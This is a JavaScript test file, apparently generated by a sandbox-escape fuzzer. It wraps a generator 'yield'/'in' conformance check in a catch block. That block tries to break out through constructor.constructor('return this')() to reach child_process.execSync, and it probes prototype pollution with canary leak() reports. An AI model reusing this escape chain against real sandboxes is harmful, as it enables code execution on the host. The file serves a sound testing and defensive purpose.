try {
    var obj = Object.create(null);
    var iter, iterResult, value;
    function* g() {
        value = yield 'hit' in obj;
        value = yield 'miss' in obj;
    }
    obj.hit = true;
    iter = g();
    iterResult = iter.next('first');
    assert.sameValue(iterResult.done, false, '`done` property (first iteration)');
    assert.sameValue(iterResult.value, true, '`value` property (first iteration)');
    assert.sameValue(value, undefined, 'generator paused prior to evaluating AssignmentExpression');
    iterResult = iter.next('second');
    assert.sameValue(iterResult.done, false, '`done` property (second iteration)');
    assert.sameValue(iterResult.value, false, '`value` property (second iteration)');
    assert.sameValue(value, 'second', 'value of first AssignmentExpression');
    iterResult = iter.next('third');
    assert.sameValue(iterResult.done, true, '`done` property (third iteration)');
    assert.sameValue(iterResult.value, undefined, '`value` property (third iteration)');
    assert.sameValue(value, 'third', 'value of second AssignmentExpression');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}